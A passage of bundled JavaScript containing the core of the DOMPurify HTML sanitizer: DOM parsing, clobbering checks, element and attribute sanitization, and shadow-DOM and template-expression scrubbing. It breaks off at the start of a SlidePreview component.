					if (element.hasAttribute && element.hasAttribute("patchsrc")) element.removeAttribute("patchsrc");
					if (element.hasAttribute && element.hasAttribute("for") && _isPatchLinkageAttribute("for", lcTag)) element.removeAttribute("for");
				} catch (_) {}
			}
			return true;
		});
	};
	/**
	* _initDocument
	*
	* @param dirty - a string of dirty markup
	* @return a DOM, filled with the dirty markup
	*/
	const _initDocument = function _initDocument(dirty) {
		let doc = null;
		let leadingWhitespace = null;
		if (FORCE_BODY) dirty = "<remove></remove>" + dirty;
		else {
			const matches = stringMatch(dirty, /^[\r\n\t ]+/);
			leadingWhitespace = matches && matches[0];
		}
		if (PARSER_MEDIA_TYPE === "application/xhtml+xml" && NAMESPACE === HTML_NAMESPACE) dirty = "<html xmlns=\"http://www.w3.org/1999/xhtml\"><head></head><body>" + dirty + "</body></html>";
		const dirtyPayload = trustedTypesPolicy ? _createTrustedHTML(dirty) : dirty;
		if (NAMESPACE === HTML_NAMESPACE) try {
			doc = new DOMParser().parseFromString(dirtyPayload, PARSER_MEDIA_TYPE);
		} catch (_) {}
		if (!doc || !doc.documentElement) {
			doc = implementation.createDocument(NAMESPACE, "template", null);
			try {
				doc.documentElement.innerHTML = IS_EMPTY_INPUT ? emptyHTML : dirtyPayload;
			} catch (_) {}
		}
		const body = doc.body || doc.documentElement;
		if (dirty && leadingWhitespace) body.insertBefore(document.createTextNode(leadingWhitespace), body.childNodes[0] || null);
		if (NAMESPACE === HTML_NAMESPACE) return getElementsByTagName.call(doc, WHOLE_DOCUMENT ? "html" : "body")[0];
		return WHOLE_DOCUMENT ? doc.documentElement : body;
	};
	/**
	* Creates a NodeIterator object that you can use to traverse filtered lists of nodes or elements in a document.
	*
	* @param root The root element or node to start traversing on.
	* @return The created NodeIterator
	*/
	const _createNodeIterator = function _createNodeIterator(root) {
		const doc = getOwnerDocument ? getOwnerDocument(root) : root.ownerDocument;
		return createNodeIterator.call(doc || root, root, NodeFilter.SHOW_ELEMENT | NodeFilter.SHOW_COMMENT | NodeFilter.SHOW_TEXT | NodeFilter.SHOW_PROCESSING_INSTRUCTION | NodeFilter.SHOW_CDATA_SECTION, null);
	};
	/**
	* Replace template expression syntax (mustache, ERB, template
	* literal) with a space; shared by all SAFE_FOR_TEMPLATES scrub
	* sites. Order matters: mustache, then ERB, then template literal.
	*
	* @param value the string to scrub
	* @returns the scrubbed string
	*/
	const _stripTemplateExpressions = function _stripTemplateExpressions(value) {
		value = stringReplace(value, MUSTACHE_EXPR$1, " ");
		value = stringReplace(value, ERB_EXPR$1, " ");
		value = stringReplace(value, TMPLIT_EXPR$1, " ");
		return value;
	};
	/**
	* Strip template-engine expressions ({{...}}, ${...}, <%...%>) from the
	* character data of an element subtree. Used as the final safety net for
	* SAFE_FOR_TEMPLATES on every DOM-returning code path so that expressions
	* which only form after text-node normalization (e.g. fragments split across
	* stripped elements) cannot survive into a template-evaluating framework.
	*
	* Walks text/comment/CDATA/processing-instruction nodes and mutates `.data`
	* in place rather than round-tripping through innerHTML. This preserves
	* descendant node references (important for IN_PLACE callers), avoids a
	* serialize/reparse cycle, and reads literal character data — which means
	* `<%...%>` in text content matches the ERB regex against its real bytes
	* instead of the HTML-entity-escaped form innerHTML would produce.
	*
	* Attribute values are not visited here; SAFE_FOR_TEMPLATES handling for
	* attributes is performed during the per-node `_sanitizeAttributes` pass.
	*
	* @param node The root element whose character data should be scrubbed.
	*/
	const _scrubTemplateExpressions2 = function _scrubTemplateExpressions(node) {
		var _node$querySelectorAl;
		_scrubOwnCharacterData(node);
		const templates = (_node$querySelectorAl = node.querySelectorAll) === null || _node$querySelectorAl === void 0 ? void 0 : _node$querySelectorAl.call(node, "template");
		if (templates) arrayForEach(templates, (tmpl) => {
			if (_isDocumentFragment(tmpl.content)) _scrubTemplateExpressions2(tmpl.content);
		});
	};
	/**
	* _scrubOwnCharacterData
	*
	* Non-recursive core of _scrubTemplateExpressions: normalize `node` and
	* strip template expressions from its own character data only. Does not
	* enter <template>.content or attached shadow roots (NodeIterator never
	* does). Used by _sanitizeShadowDOM, where every nested template content
	* and shadow root is already walked - and therefore scrubbed - by its own
	* recursive _sanitizeShadowDOM call; recursing here as well would rescrub
	* each nested fragment once per ancestor, which is quadratic in nesting
	* depth.
	*
	* @param node The root whose own character data should be scrubbed.
	*/
	const _scrubOwnCharacterData = function _scrubOwnCharacterData(node) {
		node.normalize();
		const doc = getOwnerDocument ? getOwnerDocument(node) : node.ownerDocument;
		const walker = createNodeIterator.call(doc || node, node, NodeFilter.SHOW_TEXT | NodeFilter.SHOW_COMMENT | NodeFilter.SHOW_CDATA_SECTION | NodeFilter.SHOW_PROCESSING_INSTRUCTION, null);
		let currentNode = walker.nextNode();
		while (currentNode) {
			currentNode.data = _stripTemplateExpressions(currentNode.data);
			currentNode = walker.nextNode();
		}
	};
	/**
	* _isClobbered
	*
	* Detect DOM-clobbering on HTMLFormElement nodes. Form is the only HTML
	* interface with [LegacyOverrideBuiltIns]; a descendant element with a
	* `name` attribute matching a prototype property shadows that property
	* on direct reads. We use this check at the IN_PLACE entry-point and
	* during attribute sanitization to refuse clobbered forms.
	*
	* @param element element to check for clobbering attacks
	* @return true if clobbered, false if safe
	*/
	const _isClobbered = function _isClobbered(element) {
		const realTagName = getNodeName ? getNodeName(element) : null;
		if (typeof realTagName !== "string") return false;
		if (transformCaseFunc(realTagName) !== "form") return false;
		return typeof element.nodeName !== "string" || typeof element.textContent !== "string" || typeof element.removeChild !== "function" || element.attributes !== getAttributes(element) || typeof element.removeAttribute !== "function" || typeof element.removeAttributeNode !== "function" || typeof element.getAttributeNode !== "function" || typeof element.setAttribute !== "function" || typeof element.namespaceURI !== "string" || typeof element.insertBefore !== "function" || typeof element.hasChildNodes !== "function" || element.nodeType !== getNodeType(element) || element.childNodes !== getChildNodes(element);
	};
	/**
	* Checks whether the given value is a DocumentFragment from any realm.
	*
	* The realm-independent replacement reads `nodeType` through the cached
	* Node.prototype getter and compares to the DOCUMENT_FRAGMENT_NODE
	* constant (11). nodeType is a numeric value resolved from the node's
	* internal slot, identical across realms for the same kind of node.
	*
	* @param value object to check
	* @return true if value is a DocumentFragment-shaped node from any realm
	*/
	const _isDocumentFragment = function _isDocumentFragment(value) {
		if (!getNodeType || typeof value !== "object" || value === null) return false;
		try {
			return getNodeType(value) === NODE_TYPE.documentFragment;
		} catch (_) {
			return false;
		}
	};
	/**
	* Checks whether the given object is a DOM node, including nodes that
	* originate from a different window/realm (e.g. an iframe's
	* contentDocument). The previous `value instanceof Node` check was
	* realm-bound: nodes from a different window failed it, causing
	* sanitize() to silently stringify them and reset IN_PLACE to false,
	* returning the original node unsanitized. See GHSA-4w3q-35jp-p934.
	*
	* @param value object to check whether it's a DOM node
	* @return true if value is a DOM node from any realm
	*/
	const _isNode = function _isNode(value) {
		if (!getNodeType || typeof value !== "object" || value === null) return false;
		try {
			return typeof getNodeType(value) === "number";
		} catch (_) {
			return false;
		}
	};
	function _executeHooks(hooks, currentNode, data) {
		if (hooks.length === 0) return;
		arrayForEach(hooks, (hook) => {
			hook.call(DOMPurify, currentNode, data, CONFIG);
		});
	}
	/**
	* Structural-threat checks that condemn a node regardless of the
	* allowlists: mXSS via namespace confusion, risky CSS construction,
	* processing instructions, markup-bearing comments. Pure predicate;
	* the caller removes. Check order is load-bearing.
	*
	* @param currentNode the node to inspect
	* @param tagName the node's transformCaseFunc'd tag name
	* @return true if the node must be removed
	*/
	const _isUnsafeNode = function _isUnsafeNode(currentNode, tagName) {
		if (SAFE_FOR_XML && currentNode.hasChildNodes() && !_isNode(currentNode.firstElementChild) && regExpTest(ELEMENT_MARKUP_PROBE, currentNode.textContent) && regExpTest(ELEMENT_MARKUP_PROBE, currentNode.innerHTML)) return true;
		if (SAFE_FOR_XML && LITERAL_TEXT_ELEMENTS[tagName] && _readNodeType(currentNode) === NODE_TYPE.element && _readNamespaceURI(currentNode) === HTML_NAMESPACE && (_isNode(currentNode.firstElementChild) || typeof currentNode.textContent === "string" && regExpTest(ELEMENT_MARKUP_PROBE, currentNode.textContent))) return true;
		if (currentNode.nodeType === NODE_TYPE.processingInstruction) return true;
		if (SAFE_FOR_XML && currentNode.nodeType === NODE_TYPE.comment && regExpTest(COMMENT_MARKUP_PROBE, currentNode.data)) return true;
		return false;
	};
	/**
	* Evaluate a CUSTOM_ELEMENT_HANDLING check (a RegExp or a predicate
	* function, per the validation in _parseConfig) against a name.
	* Additional arguments are forwarded to predicate functions - the
	* attributeNameCheck predicate receives the tag name as its second
	* argument. A null/absent check never matches.
	*
	* @param check the configured tagNameCheck / attributeNameCheck value
	* @param name the name to test
	* @param args extra arguments forwarded to a predicate function
	* @return true if the check matches the name
	*/
	const _matchesNameCheck = function _matchesNameCheck(check, name) {
		if (check instanceof RegExp) return regExpTest(check, name);
		if (check instanceof Function) {
			for (var _len = arguments.length, args = new Array(_len > 2 ? _len - 2 : 0), _key = 2; _key < _len; _key++) args[_key - 2] = arguments[_key];
			return Boolean(check(name, ...args));
		}
		return false;
	};
	/**
	* Handle a node whose tag is forbidden or not allowlisted: keep
	* allowed custom elements (false return exits _sanitizeElements
	* early - the namespace and fallback-tag removal checks are
	* intentionally skipped for kept custom elements), else hoist
	* content per KEEP_CONTENT and remove.
	*
	* A kept custom element is the ONLY case in which this function
	* returns false, so the caller uses that return value to run the
	* afterSanitizeElements hook on the kept element and keep the
	* element-hook lifecycle consistent with normal allowlisted
	* elements (GHSA-c2j3-45gr-mqc4).
	*
	* @param currentNode the disallowed node
	* @param tagName the node's transformCaseFunc'd tag name
	* @return true if the node was removed, false if kept
	*/
	const _sanitizeDisallowedNode = function _sanitizeDisallowedNode(currentNode, tagName, root) {
		if (!FORBID_TAGS[tagName] && _isBasicCustomElement(tagName) && _matchesNameCheck(CUSTOM_ELEMENT_HANDLING.tagNameCheck, tagName)) return false;
		if (KEEP_CONTENT && !FORBID_CONTENTS[tagName] && !FORBID_CONTENTS[stringToLowerCase(tagName)]) {
			const parentNode = getParentNode(currentNode);
			const childNodes = getChildNodes(currentNode);
			if (childNodes && parentNode) {
				const childCount = childNodes.length;
				for (let i = childCount - 1; i >= 0; --i) {
					const hoisted = currentNode === root ? cloneNode(childNodes[i], true) : childNodes[i];
					parentNode.insertBefore(hoisted, getNextSibling(currentNode));
				}
			}
		}
		_forceRemove(currentNode);
		return true;
	};
	/**
	* Fork a hook-mutable allowlist off its shared binding the first time a
	* (possibly lazily-installed) uponSanitize* hook is about to see it, so the
	* hook cannot widen the per-instance default or the setConfig binding by
	* reference and leak past the call. Returns the set unchanged once it is
	* already call-local, so repeated calls across elements are idempotent.
	*
	* @param hookList the uponSanitize* hook array for this event
	* @param set the current ALLOWED_TAGS / ALLOWED_ATTR binding
	* @param defaultSet the per-instance DEFAULT_ALLOWED_* constant
	* @param setConfigSet the captured setConfig() binding, or null
	* @return a call-local clone if a hook is present and set is still shared,
	*   else set unchanged
	*/
	const _forkSharedAllowlist = function _forkSharedAllowlist(hookList, set, defaultSet, setConfigSet) {
		if (hookList.length === 0) return set;
		return set === defaultSet || set === setConfigSet ? clone(set) : set;
	};
	/**
	* A hook may have detached the node it was called for. If so, treat it as
	* removed and stop processing it; the walk root is exempt. On the IN_PLACE
	* path the detached subtree is neutralized right away.
	*
	* @param currentNode the node a hook may have detached
	* @param root the current walk root
	* @return true if the node was detached
	*/
	const _handleHookDetachedNode = function _handleHookDetachedNode(currentNode, root) {
		if (currentNode === root || getParentNode(currentNode) !== null) return false;
		if (IN_PLACE) _neutralizeSubtree(currentNode);
		return true;
	};
	/**
	* _sanitizeElements
	*
	* @protect nodeName
	* @protect textContent
	* @protect removeChild
	* @param currentNode to check for permission to exist
	* @return true if node was killed, false if left alive
	*/
	const _sanitizeElements = function _sanitizeElements(currentNode, root) {
		_markVisited(currentNode);
		_executeHooks(hooks.beforeSanitizeElements, currentNode, null);
		if (_handleHookDetachedNode(currentNode, root)) return true;
		if (_isClobbered(currentNode)) {
			_forceRemove(currentNode);
			return true;
		}
		const tagName = transformCaseFunc(_readNodeName(currentNode));
		ALLOWED_TAGS = _forkSharedAllowlist(hooks.uponSanitizeElement, ALLOWED_TAGS, DEFAULT_ALLOWED_TAGS, SET_CONFIG_ALLOWED_TAGS);
		_executeHooks(hooks.uponSanitizeElement, currentNode, {
			tagName,
			allowedTags: ALLOWED_TAGS
		});
		if (_handleHookDetachedNode(currentNode, root)) return true;
		if (_isUnsafeNode(currentNode, tagName)) {
			_forceRemove(currentNode);
			return true;
		}
		if (FORBID_TAGS[tagName] || !(EXTRA_ELEMENT_HANDLING.tagCheck instanceof Function && EXTRA_ELEMENT_HANDLING.tagCheck(tagName)) && !ALLOWED_TAGS[tagName]) {
			const removed = _sanitizeDisallowedNode(currentNode, tagName, root);
			if (removed === false) {
				_executeHooks(hooks.afterSanitizeElements, currentNode, null);
				if (_handleHookDetachedNode(currentNode, root)) return true;
			}
			return removed;
		}
		if (_readNodeType(currentNode) === NODE_TYPE.element && !_checkValidNamespace(currentNode)) {
			_forceRemove(currentNode);
			return true;
		}
		if ((tagName === "noscript" || tagName === "noembed" || tagName === "noframes") && regExpTest(FALLBACK_TAG_CLOSE, currentNode.innerHTML)) {
			_forceRemove(currentNode);
			return true;
		}
		if (SAFE_FOR_TEMPLATES && currentNode.nodeType === NODE_TYPE.text) {
			const content = _stripTemplateExpressions(currentNode.textContent);
			if (currentNode.textContent !== content) {
				arrayPush(DOMPurify.removed, { element: currentNode.cloneNode() });
				currentNode.textContent = content;
			}
		}
		_executeHooks(hooks.afterSanitizeElements, currentNode, null);
		return _handleHookDetachedNode(currentNode, root);
	};
	/**
	* _isValidAttribute
	*
	* @param lcTag Lowercase tag name of containing element.
	* @param lcName Lowercase attribute name.
	* @param value Attribute value.
	* @return Returns true if `value` is valid, otherwise false.
	*/
	const _isValidAttribute = function _isValidAttribute(lcTag, lcName, value) {
		if (FORBID_ATTR[lcName]) return false;
		if (_isPatchLinkageAttribute(lcName, lcTag)) return false;
		if (SANITIZE_DOM && (lcName === "id" || lcName === "name") && (value in document || value in formElement)) return false;
		const nameIsPermitted = ALLOWED_ATTR[lcName] || EXTRA_ELEMENT_HANDLING.attributeCheck instanceof Function && EXTRA_ELEMENT_HANDLING.attributeCheck(lcName, lcTag);
		if (ALLOW_DATA_ATTR && regExpTest(DATA_ATTR$1, lcName)) return true;
		if (ALLOW_ARIA_ATTR && regExpTest(ARIA_ATTR$1, lcName)) return true;
		if (!nameIsPermitted) return _isBasicCustomElement(lcTag) && _matchesNameCheck(CUSTOM_ELEMENT_HANDLING.tagNameCheck, lcTag) && _matchesNameCheck(CUSTOM_ELEMENT_HANDLING.attributeNameCheck, lcName, lcTag) || lcName === "is" && CUSTOM_ELEMENT_HANDLING.allowCustomizedBuiltInElements && _matchesNameCheck(CUSTOM_ELEMENT_HANDLING.tagNameCheck, value);
		if (URI_SAFE_ATTRIBUTES[lcName]) return true;
		if (regExpTest(IS_ALLOWED_URI$1, stringReplace(value, ATTR_WHITESPACE$1, ""))) return true;
		if ((lcName === "src" || lcName === "xlink:href" || lcName === "href") && lcTag !== "script" && stringIndexOf(value, "data:") === 0 && DATA_URI_TAGS[lcTag]) return true;
		if (ALLOW_UNKNOWN_PROTOCOLS && !regExpTest(IS_SCRIPT_OR_DATA$1, stringReplace(value, ATTR_WHITESPACE$1, ""))) return true;
		return !value;
	};
	const RESERVED_CUSTOM_ELEMENT_NAMES = addToSet({}, [
		"annotation-xml",
		"color-profile",
		"font-face",
		"font-face-format",
		"font-face-name",
		"font-face-src",
		"font-face-uri",
		"missing-glyph"
	]);
	/**
	* _isBasicCustomElement
	* checks if at least one dash is included in tagName, and it's not the first char
	* for more sophisticated checking see https://github.com/sindresorhus/validate-element-name
	*
	* @param tagName name of the tag of the node to sanitize
	* @returns Returns true if the tag name meets the basic criteria for a custom element, otherwise false.
	*/
	const _isBasicCustomElement = function _isBasicCustomElement(tagName) {
		return !RESERVED_CUSTOM_ELEMENT_NAMES[stringToLowerCase(tagName)] && regExpTest(CUSTOM_ELEMENT$1, tagName);
	};
	/**
	* Wrap an attribute value in the matching Trusted Types object when
	* the active policy requires it. Namespaced attributes pass through
	* unchanged (no TT support yet, see
	* https://bugs.chromium.org/p/chromium/issues/detail?id=1305293).
	*
	* @param lcTag lowercase tag name of the containing element
	* @param lcName lowercase attribute name
	* @param namespaceURI the attribute's namespace, if any
	* @param value the attribute value to wrap
	* @return the value, wrapped when Trusted Types demand it
	*/
	const _applyTrustedTypesToAttribute = function _applyTrustedTypesToAttribute(lcTag, lcName, namespaceURI, value) {
		if (trustedTypesPolicy && typeof trustedTypes === "object" && typeof trustedTypes.getAttributeType === "function" && !namespaceURI) switch (trustedTypes.getAttributeType(lcTag, lcName)) {
			case "TrustedHTML": return _createTrustedHTML(value);
			case "TrustedScriptURL": return _createTrustedScriptURL(value);
		}
		return value;
	};
	/**
	* Write a modified attribute value back onto the element. On
	* success, re-probe for clobbering introduced by the new value and
	* remove the element when found; otherwise, when this writeback is the
	* recreate half of the SANITIZE_NAMED_PROPS remove-and-recreate, pop the
	* removal entry that path recorded so it does not show as removed. On
	* failure, remove the attribute instead.
	*
	* Returns true only on a clean write (the value was set and the new value
	* introduced no clobbering). The caller uses that, together with its own
	* knowledge of whether this attribute pushed a DOMPurify.removed record, to
	* decide whether to pop that record. The pop must happen ONLY for the
	* named-prop remove-and-recreate; popping on any other value change (trim,
	* template scrubbing, Trusted Types) would consume an unrelated _forceRemove
	* subtree-cleanup record and let that detached subtree keep a live event
	* handler through the IN_PLACE neutralization pass (SO-001).
	*
	* @param currentNode the element carrying the attribute
	* @param name the attribute name as present on the element
	* @param namespaceURI the attribute's namespace, if any
	* @param value the new attribute value
	* @return true if the value was written without introducing clobbering
	*/
	const _setAttributeValue = function _setAttributeValue(currentNode, name, namespaceURI, value) {
		try {
			if (namespaceURI) currentNode.setAttributeNS(namespaceURI, name, value);
			else currentNode.setAttribute(name, value);
			if (_isClobbered(currentNode)) {
				_forceRemove(currentNode);
				return false;
			}
			return true;
		} catch (_) {
			_removeAttribute(name, currentNode);
			return false;
		}
	};
	/**
	* _isUnsafeAttributeValue
	*
	* Value-based attribute checks that the attribute walk applies before any
	* hook can force-keep an attribute, shared with the public
	* isValidAttribute() so that it never approves a value sanitize() would
	* strip.
	*
	* @param name the attribute name as found on the node (case preserved)
	* @param value the attribute value
	* @returns true if the attribute must be removed because of its value
	*/
	const _isUnsafeAttributeValue = function _isUnsafeAttributeValue(name, value) {
		if (SAFE_FOR_XML && regExpTest(/((--!?|])>)|<\/(style|script|title|xmp|textarea|noscript|iframe|noembed|noframes)/i, value)) return true;
		return stringToLowerCase(name) === "attributename" && stringMatch(value, "href") !== null;
	};
	/**
	* _sanitizeAttributes
	*
	* @protect attributes
	* @protect nodeName
	* @protect removeAttribute
	* @protect setAttribute
	*
	* @param currentNode to sanitize
	* @param root the current walk root
	*/
	const _sanitizeAttributes = function _sanitizeAttributes(currentNode, root) {
		_executeHooks(hooks.beforeSanitizeAttributes, currentNode, null);
		if (_handleHookDetachedNode(currentNode, root)) return;
		const attributes = currentNode.attributes;
		if (!attributes || _isClobbered(currentNode)) return;
		ALLOWED_ATTR = _forkSharedAllowlist(hooks.uponSanitizeAttribute, ALLOWED_ATTR, DEFAULT_ALLOWED_ATTR, SET_CONFIG_ALLOWED_ATTR);
		const hookEvent = {
			attrName: "",
			attrValue: "",
			keepAttr: true,
			allowedAttributes: ALLOWED_ATTR,
			forceKeepAttr: void 0
		};
		let l = attributes.length;
		const lcTag = transformCaseFunc(currentNode.nodeName);
		while (l--) {
			const attr = attributes[l];
			const name = attr.name, namespaceURI = attr.namespaceURI, attrValue = attr.value;
			const lcName = transformCaseFunc(name);
			const initValue = attrValue;
			let value = name === "value" ? initValue : stringTrim(initValue);
			let recreatedNamedProp = false;
			hookEvent.attrName = lcName;
			hookEvent.attrValue = value;
			hookEvent.keepAttr = true;
			hookEvent.forceKeepAttr = void 0;
			_executeHooks(hooks.uponSanitizeAttribute, currentNode, hookEvent);
			value = hookEvent.attrValue;
			if (SANITIZE_NAMED_PROPS && (lcName === "id" || lcName === "name") && stringIndexOf(value, SANITIZE_NAMED_PROPS_PREFIX) !== 0) {
				_removeAttribute(name, currentNode, attr);
				value = SANITIZE_NAMED_PROPS_PREFIX + value;
				recreatedNamedProp = true;
			}
			if (_isUnsafeAttributeValue(name, value)) {
				_removeAttribute(name, currentNode, attr);
				continue;
			}
			if (hookEvent.forceKeepAttr) continue;
			if (!hookEvent.keepAttr) {
				_removeAttribute(name, currentNode, attr);
				continue;
			}
			if (!ALLOW_SELF_CLOSE_IN_ATTR && regExpTest(SELF_CLOSING_TAG, value)) {
				_removeAttribute(name, currentNode, attr);
				continue;
			}
			if (SAFE_FOR_TEMPLATES) value = _stripTemplateExpressions(value);
			if (!_isValidAttribute(lcTag, lcName, value)) {
				_removeAttribute(name, currentNode, attr);
				continue;
			}
			value = _applyTrustedTypesToAttribute(lcTag, lcName, namespaceURI, value);
			if (value !== initValue) {
				if (_setAttributeValue(currentNode, name, namespaceURI, value) && recreatedNamedProp) arrayPop(DOMPurify.removed);
			}
		}
		_executeHooks(hooks.afterSanitizeAttributes, currentNode, null);
		_handleHookDetachedNode(currentNode, root);
	};
	/**
	* _sanitizeShadowDOM
	*
	* @param fragment to iterate over recursively
	*/
	const _sanitizeShadowDOM2 = function _sanitizeShadowDOM(fragment) {
		let shadowNode = null;
		const shadowIterator = _createNodeIterator(fragment);
		_executeHooks(hooks.beforeSanitizeShadowDOM, fragment, null);
		while (shadowNode = shadowIterator.nextNode()) {
			_executeHooks(hooks.uponSanitizeShadowNode, shadowNode, null);
			_sanitizeElements(shadowNode, fragment);
			_sanitizeAttributes(shadowNode, fragment);
			if (_isDocumentFragment(shadowNode.content)) _sanitizeShadowDOM2(shadowNode.content);
			if (_readNodeType(shadowNode) === NODE_TYPE.element) {
				const innerSr = getShadowRoot(shadowNode);
				if (_isDocumentFragment(innerSr)) {
					_sanitizeAttachedShadowRoots(innerSr);
					_sanitizeShadowDOM2(innerSr);
				}
			}
		}
		if (SAFE_FOR_TEMPLATES) _scrubOwnCharacterData(fragment);
		_executeHooks(hooks.afterSanitizeShadowDOM, fragment, null);
	};
	/**
	* Sanitizes every attached shadow root under `root`, since the node
	* iterator does not enter shadow trees. Needed for IN_PLACE input and for
	* DOM input whose clonable shadow roots were copied by importNode().
	*
	* @param root the subtree root to walk for attached shadow roots
	*/
	const _sanitizeAttachedShadowRoots = function _sanitizeAttachedShadowRoots(root) {
		const stack = [{
			node: root,
			shadow: null
		}];
		while (stack.length > 0) {
			const item = stack.pop();
			if (item.shadow) {
				_sanitizeShadowDOM2(item.shadow);
				continue;
			}
			const node = item.node;
			const isElement = _readNodeType(node) === NODE_TYPE.element;
			const childNodes = getChildNodes(node);
			if (childNodes) for (let i = childNodes.length - 1; i >= 0; --i) stack.push({
				node: childNodes[i],
				shadow: null
			});
			if (isElement) {
				const rootName = getNodeName ? getNodeName(node) : null;
				if (typeof rootName === "string" && transformCaseFunc(rootName) === "template") {
					const content = node.content;
					if (_isDocumentFragment(content)) stack.push({
						node: content,
						shadow: null
					});
				}
			}
			if (isElement) {
				const sr = getShadowRoot(node);
				if (_isDocumentFragment(sr)) stack.push({
					node: null,
					shadow: sr
				}, {
					node: sr,
					shadow: null
				});
			}
		}
	};
	DOMPurify.sanitize = function(dirty) {
		let cfg = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
		let body = null;
		let importedNode = null;
		let currentNode = null;
		let returnNode = null;
		IS_EMPTY_INPUT = !dirty;
		if (IS_EMPTY_INPUT) dirty = "<!-->";
		if (typeof dirty !== "string" && !_isNode(dirty)) {
			dirty = stringifyValue(dirty);
			if (typeof dirty !== "string") throw typeErrorCreate("dirty is not a string, aborting");
		}
		if (!DOMPurify.isSupported) return dirty;
		if (SET_CONFIG) {
			ALLOWED_TAGS = SET_CONFIG_ALLOWED_TAGS;
			ALLOWED_ATTR = SET_CONFIG_ALLOWED_ATTR;
		} else _parseConfig(cfg);
		if (hooks.uponSanitizeElement.length > 0 || hooks.uponSanitizeAttribute.length > 0) ALLOWED_TAGS = clone(ALLOWED_TAGS);
		if (hooks.uponSanitizeAttribute.length > 0) ALLOWED_ATTR = clone(ALLOWED_ATTR);
		DOMPurify.removed = [];
		const inPlace = IN_PLACE && typeof dirty !== "string" && _isNode(dirty);
		let inPlaceNodes = [];
		const outerVisited = IN_PLACE_VISITED;
		if (inPlace) {
			_neutralizePatchLinkage(dirty);
			const nn = _readNodeName(dirty);
			if (typeof nn === "string") {
				const tagName = transformCaseFunc(nn);
				if (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName]) {
					_neutralizeRoot(dirty);
					throw typeErrorCreate("root node is forbidden and cannot be sanitized in-place");
				}
			}
			if (_isClobbered(dirty)) {
				_neutralizeRoot(dirty);
				throw typeErrorCreate("root node is clobbered and cannot be sanitized in-place");
			}
			inPlaceNodes = _collectLiveNodes(dirty);
			IN_PLACE_VISITED = setCreate();
		} else if (_isNode(dirty)) {
			body = _initDocument("<!---->");
			importedNode = body.ownerDocument.importNode(dirty, true);
			if (importedNode.nodeType === NODE_TYPE.element && importedNode.nodeName === "BODY") body = importedNode;
			else if (importedNode.nodeName === "HTML") body = importedNode;
			else body.appendChild(importedNode);
			_sanitizeAttachedShadowRoots(body);
		} else {
			if (!RETURN_DOM && !SAFE_FOR_TEMPLATES && !WHOLE_DOCUMENT && dirty.indexOf("<") === -1) return trustedTypesPolicy && RETURN_TRUSTED_TYPE ? _createTrustedHTML(dirty) : dirty;
			body = _initDocument(dirty);
			if (!body) return RETURN_DOM ? null : RETURN_TRUSTED_TYPE ? emptyHTML : "";
		}
		if (body && FORCE_BODY) _forceRemove(body.firstChild);
		const walkRoot = inPlace ? dirty : body;
		try {
			if (inPlace) _sanitizeAttachedShadowRoots(dirty);
			const nodeIterator = _createNodeIterator(walkRoot);
			while (currentNode = nodeIterator.nextNode()) {
				_sanitizeElements(currentNode, walkRoot);
				_sanitizeAttributes(currentNode, walkRoot);
				if (_isDocumentFragment(currentNode.content)) _sanitizeShadowDOM2(currentNode.content);
			}
			if (inPlace) _sanitizeUnvisitedNodes(dirty, inPlaceNodes);
		} catch (error) {
			if (inPlace) {
				_neutralizeRoot(dirty);
				_neutralizeDiscarded(dirty, inPlaceNodes);
			}
			throw error;
		} finally {
			IN_PLACE_VISITED = outerVisited;
		}
		if (inPlace) {
			if (_neutralizeDiscarded(dirty, inPlaceNodes)) throw typeErrorCreate("a node selected for removal could not be safely returned; refusing to sanitize in place");
			if (SAFE_FOR_TEMPLATES) _scrubTemplateExpressions2(dirty);
			return dirty;
		}
		if (RETURN_DOM) {
			if (SAFE_FOR_TEMPLATES) _scrubTemplateExpressions2(body);
			if (RETURN_DOM_FRAGMENT) {
				returnNode = createDocumentFragment.call(body.ownerDocument);
				while (body.firstChild) returnNode.appendChild(body.firstChild);
			} else returnNode = body;
			if (ALLOWED_ATTR.shadowroot || ALLOWED_ATTR.shadowrootmode) returnNode = importNode.call(originalDocument, returnNode, true);
			return returnNode;
		}
		let serializedHTML = WHOLE_DOCUMENT ? body.outerHTML : body.innerHTML;
		if (WHOLE_DOCUMENT && ALLOWED_TAGS["!doctype"] && body.ownerDocument && body.ownerDocument.doctype && body.ownerDocument.doctype.name && regExpTest(DOCTYPE_NAME, body.ownerDocument.doctype.name)) serializedHTML = "<!DOCTYPE " + body.ownerDocument.doctype.name + ">\n" + serializedHTML;
		if (SAFE_FOR_TEMPLATES) serializedHTML = _stripTemplateExpressions(serializedHTML);
		return trustedTypesPolicy && RETURN_TRUSTED_TYPE ? _createTrustedHTML(serializedHTML) : serializedHTML;
	};
	DOMPurify.setConfig = function() {
		let cfg = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
		_parseConfig(cfg);
		SET_CONFIG = true;
		SET_CONFIG_ALLOWED_TAGS = ALLOWED_TAGS;
		SET_CONFIG_ALLOWED_ATTR = ALLOWED_ATTR;
	};
	DOMPurify.clearConfig = function() {
		CONFIG = null;
		SET_CONFIG = false;
		SET_CONFIG_ALLOWED_TAGS = null;
		SET_CONFIG_ALLOWED_ATTR = null;
		trustedTypesPolicy = defaultTrustedTypesPolicy;
		emptyHTML = "";
	};
	DOMPurify.isValidAttribute = function(tag, attr, value) {
		if (!CONFIG) _parseConfig({});
		const lcTag = transformCaseFunc(tag);
		const lcName = transformCaseFunc(attr);
		if (typeof value === "string" && (_isUnsafeAttributeValue(attr, value) || !ALLOW_SELF_CLOSE_IN_ATTR && regExpTest(SELF_CLOSING_TAG, value))) return false;
		return _isValidAttribute(lcTag, lcName, value);
	};
	DOMPurify.addHook = function(entryPoint, hookFunction) {
		if (typeof hookFunction !== "function") return;
		if (!objectHasOwnProperty(hooks, entryPoint)) return;
		arrayPush(hooks[entryPoint], hookFunction);
	};
	DOMPurify.removeHook = function(entryPoint, hookFunction) {
		if (!objectHasOwnProperty(hooks, entryPoint)) return;
		if (hookFunction !== void 0) {
			const index = arrayLastIndexOf(hooks[entryPoint], hookFunction);
			return index === -1 ? void 0 : arraySplice(hooks[entryPoint], index, 1)[0];
		}
		return arrayPop(hooks[entryPoint]);
	};
	DOMPurify.removeHooks = function(entryPoint) {
		if (!objectHasOwnProperty(hooks, entryPoint)) return;
		hooks[entryPoint] = [];
	};
	DOMPurify.removeAllHooks = function() {
		hooks = _createHooksMap();
	};
	return DOMPurify;
}
var purify_default = createDOMPurify();
// src/SlidePreview.tsx
/**
* SlidePreview — renders one composed slide as SVG, animating what just changed.
*
* The engine's compose step emits a payload of per-component SVG fragments plus
